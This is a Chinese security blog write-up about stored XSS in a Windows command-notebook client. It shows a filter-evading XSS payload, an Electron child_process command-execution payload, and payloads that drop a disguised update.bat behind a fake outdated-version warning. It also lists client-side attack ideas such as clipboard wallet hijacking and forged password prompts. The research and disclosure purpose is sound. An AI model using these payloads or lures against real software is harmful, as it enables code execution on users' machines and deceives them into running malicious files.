# 从XSS到"RCE"的PC端利用链构建-先知社区

> **来源**: https://xz.aliyun.com/news/17977  
> **文章ID**: 17977

---

# 从XSS到"RCE"的PC端利用链构建

## 前言

先铺垫一下。笔者有一个习惯，懒得记各种命令和payload，手工渗透测试时，遇到比较长的payload的情况下，不想一个一个地去手敲命令，于是我之前就在github上想寻找一个类似于记事本的软件，但是最好和我的记录命令的需求适配，于是就找到了一位师傅写的开源项目，一个专门用来记录命令的记事本，一直沿用至今，很方便哈哈

![](images/20250513192504-eac3c07d-2fec-1.png)

## 偶然邂逅

昨天，我在逛一些技术帖子的时候，看到一位大师傅分享的XSS payload，当时觉得这个payload我没咋见过捏，于是就想着来分析分析，我们看看这个payload妙在哪些地方？

```
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

**1. 利用冷门事件，规避黑名单过滤**

经典绕过手法，使用冷门事件规避黑名单，oncontentvisibilityautostatechange 是一个与 content-visibility CSS属性关联的事件，很少被XSS防御规则收录。传统过滤器通常针对常见事件（如onload、onerror）。于是此事件因冷门性更易绕过检测。并且，当元素的content-visibility状态如从隐藏变为可见时，事件会自动触发，无需用户交互，就能实现"静默"攻击。

**2. 合法CSS属性掩护恶意逻辑**

合法的样式属性content-visibility: auto 是标准的性能优化CSS属性，用于延迟渲染非视口内容。该属性本身无害，可轻松通过内容安全策略（CSP）或过滤器的白名单检查。样式与事件逻辑紧密结合，攻击行为被隐藏在合法功能中

**3. input低风险标签优势**

使用<input>标签相比于<script>或<img>等高风险标签，<input>通常被视为安全元素，可能会被更大程度地允许在用户输入中使用（如评论框），从而绕过标签黑名单。

于是，这么好的payload，按照笔者的习惯那肯定得记录下来呀，又多积累了一个绕过的payload。

于是我把这个payload贴到这个工具上去（windows客户端版本）

​

结果，惊喜出现了，这个客户端居然直接弹窗了，执行了该payload

![](images/20250513192507-ec733cb4-2fec-1.png)

有点意思

## 临时抱佛脚

XSS在web端的利用面其实不算很多，盗cookie，钓鱼，挂马，水坑，结合CSRF打组合拳，蠕虫等等，但是客户端的XSS利用面就很广了，在一定条件下甚至能直接RCE！

客户端的XSS大致能怎么利用呢？我也不会，PC端的东西还没有系统学习过，问一下AI呗，主打一个现学现用哈哈哈（大佬们轻喷）

下面简单总结一下，抛砖引玉：

**1. 系统级权限逃逸（RCE）**

* **Electron/Node.js场景**

若客户端基于Electron框架且未启用nodeIntegration: false等安全配置，XSS可直接调用child\_process模块执行系统命令。

示例：<script>require('child\_process').exec('calc.exe')</script>弹出计算器

* **Java WebView/JNI调用**：

Android WebView若启用setJavaScriptEnabled(true)并绑定Java接口，XSS可通过反射调用敏感API。

**2. 本地敏感数据窃取**

* **本地文件系统遍历**：

利用FileReader/fetch读取客户端配置文件（如file://协议访问），窃取数据库凭证或加密密钥。

案例：读取Electron应用的localStorage.json或IndexedDB数据。

* **剪贴板劫持**：

监控document.oncopy/onpaste事件，篡改加密货币钱包地址实现资产转移。

**3. 硬件设备控制**

* **摄像头/麦克风滥用**：

通过navigator.mediaDevices.getUserMedia()静默启用设备，实现监控。

* **蓝牙/USB渗透**：

调用客户端绑定的硬件API（如Web Bluetooth），扫描配对设备并注入恶意固件。

**4. 客户端供应链污染**

* **自动更新劫持**：

篡改客户端自动更新逻辑（如替换update.json），强制下载捆绑恶意代码的版本。

* **插件系统攻击**：

针对插件化架构（如VSCode扩展），通过XSS注入恶意插件代码实现持久化。

**5. 横向移动与组合攻击**

* **自定义协议滥用（Deep Link）**：

利用myapp://协议调用其他应用，结合已知漏洞链扩大攻击面（如启动存在RCE漏洞的PDF阅读器）。

* **内存漏洞触发**：

通过XSS精准覆盖缓冲区，触发客户端依赖库的0day漏洞（如旧版Chromium漏洞）。

**6. 社会工程增强**

* **高仿系统弹窗**：

利用客户端GUI特性伪造系统权限请求窗口（如"输入密码以更新"），诱导用户泄露敏感信息。

* **本地网络探测**：

通过WebRTC获取内网IP，扫描局域网设备（如路由器管理界面），结合默认凭据进一步渗透。

## 曲线救国

一下列举了这么多利用思路，好多我也不会哈哈，不过没关系，遇到了再去利用再去深入学习嘛

于是我尝试看看我这个案例能不能RCE呢……

其实最直接RCE的方式就是，当客户端基于Electron框架且未启用nodeIntegration: false等安全配置时，直接就能构造出RCE的payload了，而且可以做到无感RCE，就是不需要用户有过多的交互。

```
<input style=content-visibility:auto oncontentvisibilityautostatechange="require('child_process').exec('calc.exe')">
```

但是……很遗憾，这个工具不是基于Electron框架开发的，上面的payload不适用。那么就基本无法实现无感RCE了

不过可以这样，曲线救国，实现一个比较鸡肋的"RCE"，就是需要用户的一些交互才能完成。

比如，写入一个bat文件，取名叫什么update.bat，欺骗用户保存bat文件，并点击运行，严格来说不能算真正的RCE，因为客户端的RCE强调无感，我这个只能算曲线救国

我们直接构造一个写入bat文件的payload（但是需要用户手动保存）

```
<input style=content-visibility:auto oncontentvisibilityautostatechange="(async()=>{const f=await window.showSaveFilePicker({suggestedName:'update.bat',types:[{accept:{'application/bat':['.bat']}}]});const w=await f.createWritable();await w.write('start /min calc.exe');await w.close();})()">
```

​

```
(async()=>{
  const f = await window.showSaveFilePicker({
    suggestedName: 'update.bat',
    types: [{accept: {'application/bat': ['.bat']}}]
  });
  const w = await f.createWritable(); 
  //创建可写流，f.createWritable()生成写入流，避免一次性加载内容到内存。
  await w.write('start /min calc.exe'); 
  //写入恶意命令，start /min calc.exe 会以最小化窗口启动计算器，实际攻击中可替换为恶意脚本
  await w.close();
})()
```

* 简单分析一下payload的逻辑：

**用到的核心API是****showSaveFilePicker**

```
他是现代浏览器API，用于请求用户保存文件，弹出系统级保存对话框。

关键参数

suggestedName: 'update.bat'

types: [{accept: {'application/bat': ['.bat']}}]
```

1. 使用文件名伪装suggestedName: 'update.bat'利用系统更新文件的命名习惯降低用户戒心
2. MIME类型欺骗，声明types: [{accept: {'application/bat'类型，绕过对text/plain或application/octet-stream的过滤
3. 扩展名锁定，强制指定types: [{accept: {'application/bat': ['.bat']}}]扩展名，确保文件可执行性
4. 恶意内容注入，使用createWritable + write的方式来写入文件 const w = await f.createWritable();
5. 流式写入，采用WritableStream API避免内存中拼接完整文件内容，规避基于内容长度的检测

**现在效果是这样的**

1. 点击payload标签栏，就能触发xss代码，自动弹窗资源管理器，保存update.bat文件，但是这一步需要用户确认保存

![](images/20250513192510-ee5af943-2fec-1.png)

2. 保存之后，还是需要用户自己去运行bat文件才能弹出计算器

![](images/20250513192512-ef84e76e-2fec-1.png)

3. 很鸡肋是不是哈哈，于是我们需要加入弹窗，欺骗一下下受害者

```
<input style="content-visibility:auto" oncontentvisibilityautostatechange="(async()=>{if(confirm('是否保存更新文件 update.bat？')){const f=await window.showSaveFilePicker({suggestedName:'update.bat',types:[{accept:{'application/bat':['.bat']}}]});const w=await f.createWritable();await w.write('start /min calc.exe');await w.close();alert('文件已保存，请运行 update.bat 文件以启动计算器。');}})()">
```

4. 这样要稍微好一点点

```
<input style="content-visibility:auto" oncontentvisibilityautostatechange="(async()=>{alert('当前版本过旧，可能存在漏洞险，请下载更新程序更新到最新版本！'); const f=await window.showSaveFilePicker({suggestedName:'update.bat',types:[{accept:{'application/bat':['.bat']}}]});const w=await f.createWritable();await w.write('start /min calc.exe');await w.close();alert('更新程序下载完成，请运行程序自动更新！');})()">
```

6. 点击payload标签栏，触发xss代码弹窗，提示版本老旧，存在漏洞风险更新

![](images/20250513192514-f0d00761-2fec-1.png)

7. 只有一个按钮，用户不得不点确定，然后就会自动写入update.bat文件

![](images/20250513192517-f265b492-2fec-1.png)

8. 但是需要用户手动保存
9. 然后保存之后，就会弹窗提示用户执行

![](images/20250513192520-f42c248e-2fec-1.png)

10. 假如用户执行了，那么就能执行里面的恶意代码了（需要免杀）

![](images/20250513192521-f52149b1-2fec-1.png)

**这个案例再次印证了安全领域的"海因里希法则"——每起严重漏洞背后，必然有29次轻微漏洞和300起未遂先兆。那些看似无害的XSS payload记录行为，恰恰成为了攻击链的关键支点。当我们惊叹于APT攻击的精妙时，不妨多审视日常开发中的"便利性妥协"，或许正是这些细微处的风险累积，最终筑成了攻防天平倾斜的转折点。**

## 最后挣扎

其实，我感觉想要做到无感RCE还有一种更直接的办法，就是直接去审计这个项目的源码啊！可以找找前后端有没有什么危险函数，能够通过js调用执行，并且能逃逸出沙箱，执行系统命令的地方。经过对后端代码的审计，没有发现什么可控的地方，唯一可控的就是配置文件的内容，但后端都写死了，无明显的危险操作，无法无感RCE

## 后记

ok，到此全篇结束。本文没有什么太大的技术含量，纯粹比较有趣（对我来说），甚至是现学现卖的哈哈。短期内，其实用处不是很大，**但是我个人觉得，往往正是这些无用之用，这些学安全路上的小发现、小惊喜才是支撑我们夜以继日、废寝忘食地搞安全的最大动力！也正是这些无用之用，我们才一点一点成长成如今的模样……**

晚辈技术浅陋，行文难免不当，还请师傅们多多指教！

更多精彩技术文章，欢迎关注【The One安全】微信公众号！
